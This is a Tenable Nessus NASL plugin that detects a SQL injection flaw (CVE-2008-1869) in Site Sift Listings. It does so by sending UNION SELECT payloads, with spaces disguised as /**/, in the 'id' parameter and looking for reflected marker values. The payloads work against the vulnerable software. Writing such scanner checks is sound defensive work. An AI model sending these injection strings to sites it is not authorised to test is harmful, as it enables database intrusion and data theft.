#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31790);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2008-1869");
  script_bugtraq_id(28644);
  script_osvdb_id(44140);
  script_xref(name:"EDB-ID", value:"5383");
  script_xref(name:"Secunia", value:"29705");

  script_name(english:"Site Sift Listings detail.php id Parameter SQL Injection");
  script_summary(english:"Tries to manipulate link information");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Site Sift, a PHP script for maintaining a
web directory. 

The version of Site Sift installed on the remote host fails to
sanitize user-supplied input to the 'id' parameter before before using
it in the 'detail.php' script to construct a database query. 
Regardless of PHP's 'magic_quotes_gpc' setting, an unauthenticated
attacker may be able to exploit this issue to manipulate database
queries, leading to disclosure of sensitive information, modification
of data, or attacks against the underlying database." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/04/08");
 script_cvs_date("$Date: 2016/05/19 18:02:18 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:site_sift_media:site_sift_listings");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


magic1 = unixtime();
magic2 = rand();

exploits = make_list(
  string("-99999 UNION SELECT 0,1,concat(", magic1, ",0x3a,", magic2, "),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20"),
  string("-99999 UNION SELECT 0,1,concat(", magic1, ",0x3a,", magic2, "),3,4,5,6,7,8,9,10,11,12,13,14,15,16")
);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/site_sift", "/sitesift", "/directory", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to manipulate a link detail.
  foreach exploit (exploits)
  {
    w = http_send_recv3(method:"GET", 
      item:string(
        dir, "/index.php?",
        "go=detail&",
        "id=", str_replace(find:" ", replace:"/**/", string:exploit)
      ), 
      port:port
    );
    if (isnull(w)) exit(1, "The web server did not answer");
    res = w[2];

    # There's a problem if we could manipulate the link detail.
    if (string(">Link Information &raquo;&nbsp; ", magic1, ":", magic2, "</p>") >< res)
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
